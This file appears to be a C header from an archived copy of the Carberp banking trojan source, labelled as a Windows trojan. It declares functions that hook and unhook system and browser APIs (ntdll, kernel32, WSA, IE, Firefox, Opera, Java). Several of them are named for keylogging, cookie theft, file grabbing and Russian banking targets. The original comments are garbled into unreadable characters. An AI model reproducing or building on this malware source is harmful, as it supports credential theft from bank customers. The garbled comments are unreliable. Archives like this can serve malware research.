/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include <windows.h>


void WINAPI RestoreFuncs(TDllId Dll, DWORD *dwFuncMass);

void UnhookDlls();
void UnhookNtDll();
void UnhookIE();
void UnhookFF();
void UnhookWSA();
void UnhookUser32();

/// ������� ����������� ��� ���������� RuBnk
//#ifdef RuBnkH
void UnhookTranslateMessage();
void UnhookCreateFileW();
void UnhookIBancShowCreate();
void UnhookShowWindow();
//#endif
// ������� ����, ���������� ��� �������� ������� �� ��
void UnhookCookie();
// ������������� ������� �� �����, ��� ������ ����������, �� ���� �� �� ������ �������
void UnhookOpera(DWORD dwAddr);
// java
void UnhookJava();
void UnhookGetMessagePos();
void UnhookKeyLogger();
void UnhookSber();
void UnhookSetFocus();

//FileGrabber
void UnhookCreateFile();

void UnhookBeginEndPaint();

void UnhookKernel32Functions(DWORD* Functions);